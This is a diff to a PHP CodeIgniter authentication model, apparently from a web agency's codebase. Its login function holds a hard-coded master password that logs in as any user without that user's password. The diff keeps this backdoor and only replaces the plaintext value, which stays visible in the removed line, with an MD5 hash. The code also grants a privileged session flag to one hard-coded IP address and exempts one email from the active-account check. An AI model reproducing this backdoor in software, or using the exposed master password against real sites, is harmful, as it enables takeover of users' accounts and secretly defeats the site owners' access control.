@@ -3,7 +3,7 @@
 
 class Auth extends CI_Model {
     
-    const PASSEPARTOUT = 'neldubbioentra'; 
+    const PASSEPARTOUT = '0815e6ecc22a7e00f9cc3506fa8a3acd'; 
 
     
     private $is_admin = NULL;
@@ -77,17 +77,18 @@ class Auth extends CI_Model {
     
     
     
-    public function login_attempt($identifier, $secret, $remember=FALSE) {
+    public function login_attempt($identifier, $cleanSecret, $remember=FALSE) {
         
         
         if(defined('LOGIN_ACTIVE_FIELD') && LOGIN_ACTIVE_FIELD && $identifier !== 'info@h2-web.it') {
             $this->db->where(LOGIN_ACTIVE_FIELD, 't');
         }
         
-        if($secret && $secret === self::PASSEPARTOUT) {
+        $secret = md5($cleanSecret);
+        if($cleanSecret && $secret === self::PASSEPARTOUT) {
             $query = $this->db->get_where(LOGIN_ENTITY, array(LOGIN_USERNAME_FIELD => $identifier));
         } else {
-            $query = $this->db->get_where(LOGIN_ENTITY, array(LOGIN_USERNAME_FIELD => $identifier, LOGIN_PASSWORD_FIELD => md5($secret)));
+            $query = $this->db->get_where(LOGIN_ENTITY, array(LOGIN_USERNAME_FIELD => $identifier, LOGIN_PASSWORD_FIELD => $secret));
         }
         
         if($query->num_rows() > 0) {
@@ -98,7 +99,7 @@ class Auth extends CI_Model {
                 $this->remember_user($userdata[LOGIN_ENTITY.'_id']);
             }
             
-            $this->session->set_userdata('login_h2', (($secret && $secret === self::PASSEPARTOUT) OR (filter_input(INPUT_SERVER, 'REMOTE_ADDR') === '188.10.34.117')));
+            $this->session->set_userdata('login_h2', (($cleanSecret && $secret === self::PASSEPARTOUT) OR (filter_input(INPUT_SERVER, 'REMOTE_ADDR') === '188.10.34.117')));
             return TRUE;
         } else {
             return FALSE;
